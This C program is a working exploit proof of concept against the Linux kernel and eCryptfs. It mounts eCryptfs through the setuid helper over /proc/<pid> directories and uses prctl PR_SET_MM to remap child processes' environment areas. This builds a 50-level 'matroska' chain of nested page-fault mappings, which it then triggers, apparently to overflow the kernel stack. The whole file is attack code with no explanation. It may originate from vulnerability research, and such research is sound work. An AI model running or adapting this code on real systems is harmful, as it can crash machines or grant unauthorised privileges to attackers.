#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdint.h>
#include <keyutils.h>
#include <errno.h>
#include <ecryptfs.h>
#include <sys/eventfd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <sched.h>

void set_env_area(char *ptr, size_t size) {
  struct prctl_mm_map mm_map = {
    .start_code = 0x400000,
    .end_code = 0x400001,
    .start_data = 0x400002,
    .end_data = 0x400003,
    .start_brk = 0x400004,
    .brk = (uint64_t)sbrk(0),
    .start_stack = 0x100000000,
    .arg_start = 0x100000002,
    .arg_end = 0x100000004,
    .env_start = (uint64_t)ptr,
    .env_end = (uint64_t)ptr + size,
    .auxv_size = 0,
    .exe_fd = -1
  };
  if (prctl(PR_SET_MM, PR_SET_MM_MAP, &mm_map, sizeof(mm_map), 0))
    err(1, "PR_SET_MM_MAP");
}

void write_file(char *dir, char *name, char *data) {
  char path[500];
  sprintf(path, "%s/%s", dir, name);
  int fd = open(path, O_WRONLY|O_TRUNC|O_CREAT, 0600);
  if (fd == -1)
    err(1, "opening %s failed", path);
  if (write(fd, data, strlen(data)) != strlen(data))
    errx(1, "write to %s failed", path);
  close(fd);
}

size_t read_file(char *dir, char *name, char **data) {
  char path[500];
  sprintf(path, "%s/%s", dir, name);
  int fd = open(path, O_RDONLY);
  if (fd == -1)
    err(1, "open \"%s\"", path);
  struct stat st;
  if (fstat(fd, &st))
    err(1, "fstat");
  *data = malloc(st.st_size);
  if (!*data)
    err(1, "malloc");
  if (read(fd, *data, st.st_size) != st.st_size)
    errx(1, "read_file read");
  close(fd);
  return st.st_size;
}

char *mmap_file(char *path, size_t len) {
  int fd = open(path, O_RDONLY);
  if (fd == -1)
    err(1, "open \"%s\"", path);
  errno = 0;
  char *ptr = mmap(NULL, len, PROT_READ, MAP_PRIVATE, fd, 0);
  if (ptr == MAP_FAILED)
    err(1, "mmap");
  close(fd);
  return ptr;
}

void copy_file(char *srcdir, char *srcname, char *dstdir, char *dstname) {
  char cmd[1000];
  sprintf(cmd, "cp '%s/%s' '%s/%s'", srcdir, srcname, dstdir, dstname);
  if (system(cmd))
    errx(1, "system(\"%s\")", cmd);
}

void eventfd_wait(int fd) {
  uint64_t ctr;
  ssize_t res = read(fd, &ctr, 8);
  if (res != 8)
    err(1, "eventfd_wait");
}

void eventfd_send(int fd) {
  uint64_t ctr = 1;
  ssize_t res = write(fd, &ctr, 8);
  if (res != 8)
    err(1, "eventfd_send");
}

#define MATROSKA_DEPTH 50

pid_t children[MATROSKA_DEPTH];
int sync_eventfds_to_child[MATROSKA_DEPTH];
int sync_eventfds_from_child[MATROSKA_DEPTH];

int main(void) {
  // first, set up an ecryptfs for matroska creation
  char sig[ECRYPTFS_SIG_SIZE_HEX + 1];
  char salt[ECRYPTFS_SALT_SIZE] = {0};
  if (ecryptfs_add_passphrase_key_to_keyring(sig, "foobar", salt) < 0)
    errx(1, "unable to add key to keyring");
  char ecryptfs_dir[300];
  sprintf(ecryptfs_dir, "%s/.ecryptfs", getenv("HOME"));
  if (mkdir(ecryptfs_dir, 0700) && errno != EEXIST)
    err(1, "mkdir");
  /* single line; no filename encryption key */
  write_file(ecryptfs_dir, "exploit.sig", sig);
  if (mkdir("/tmp/exploit_mount", 0700) && errno != EEXIST)
    err(1, "mkdir in /tmp");
  if (mkdir("/tmp/exploit_lower", 0700) && errno != EEXIST)
    err(1, "mkdir in /tmp");
  char conf_data[500];
  sprintf(conf_data, "/tmp/exploit_lower /tmp/exploit_mount ecryptfs none 0 0\n");
  write_file(ecryptfs_dir, "exploit.conf", conf_data);
  if (system("/sbin/mount.ecryptfs_private exploit"))
    errx(1, "mount1 failed");

  // now, create the matroskas
  char MATROSKA_ZERO[50 * 1024]; /* 50KiB, should be sufficient to prevent caching */
  memset(MATROSKA_ZERO, 0x42, sizeof(MATROSKA_ZERO));
  write_file("/tmp/exploit_mount", "1", MATROSKA_ZERO);
  sync();
  for (int i=1; i<MATROSKA_DEPTH; i++) {
    char i_str[10];
    char nexti_str[10];
    sprintf(i_str, "%d", i);
    sprintf(nexti_str, "%d", i+1);
    copy_file("/tmp/exploit_lower", i_str, "/tmp/exploit_mount", nexti_str);
    sync();
  }

  // create threads
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    sync_eventfds_to_child[i] = eventfd(0, EFD_SEMAPHORE);
    if (sync_eventfds_to_child[i] == -1)
      err(1, "eventfd");
    sync_eventfds_from_child[i] = eventfd(0, EFD_SEMAPHORE);
    if (sync_eventfds_from_child[i] == -1)
      err(1, "eventfd");
  }
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    pid_t child = fork();
    if (child == -1)
      err(1, "fork");
    if (child == 0) {
      char filenumstr[10];
      sprintf(filenumstr, "%d", i+1);
      char *direct_matroska;
      size_t direct_matroska_len = read_file("/tmp/exploit_lower", filenumstr, &direct_matroska);
      set_env_area(direct_matroska, direct_matroska_len);

      // Note: This yields control to the main process and only resumes after all the children
      // have passed this point!
      eventfd_send(sync_eventfds_from_child[i]);
      eventfd_wait(sync_eventfds_to_child[i]);

      if (i != MATROSKA_DEPTH - 1) {
        // map lower environ as environ
        char new_env_path[300];
        sprintf(new_env_path, "/tmp/exploit_mounts/%d/environ", i+1);
        char *new_env = mmap_file(new_env_path, direct_matroska_len);
        set_env_area(new_env, direct_matroska_len);
      }

      eventfd_send(sync_eventfds_from_child[i]);
      eventfd_wait(sync_eventfds_to_child[i]);

      exit(0);
    }
    eventfd_wait(sync_eventfds_from_child[i]);
    children[i] = child;
  }

  // set up mounts
  if (mkdir("/tmp/exploit_mounts", 0700) && errno != EEXIST)
    err(1, "mkdir in /tmp");
  for (int i=0; i<MATROSKA_DEPTH; i++) {
    char exploit_mount_subpath[300];
    sprintf(exploit_mount_subpath, "/tmp/exploit_mounts/%d", i);
    if (mkdir(exploit_mount_subpath, 0700) && errno != EEXIST)
      err(1, "mkdir in /tmp");

    // note: the umount helper removed the key, reinsert it
    if (ecryptfs_add_passphrase_key_to_keyring(sig, "foobar", salt) < 0)
      errx(1, "unable to add key to keyring");
    sprintf(conf_data, "/proc/%d /tmp/exploit_mounts/%d ecryptfs none 0 0\n", (int)children[i], i);
    write_file(ecryptfs_dir, "exploit.conf", conf_data);
    if (system("/sbin/mount.ecryptfs_private exploit"))
      errx(1, "system failed");
  }

  // map lower environ
  char *top_map = mmap_file("/tmp/exploit_mounts/0/environ", sizeof(MATROSKA_ZERO));
  for (int i=0; i<MATROSKA_DEPTH; i++) {
      eventfd_send(sync_eventfds_to_child[i]);
      eventfd_wait(sync_eventfds_from_child[i]);
  }

  puts("fault chain set up, faulting now");
  return *(unsigned long *)(top_map + sizeof(MATROSKA_ZERO) - 8);
}
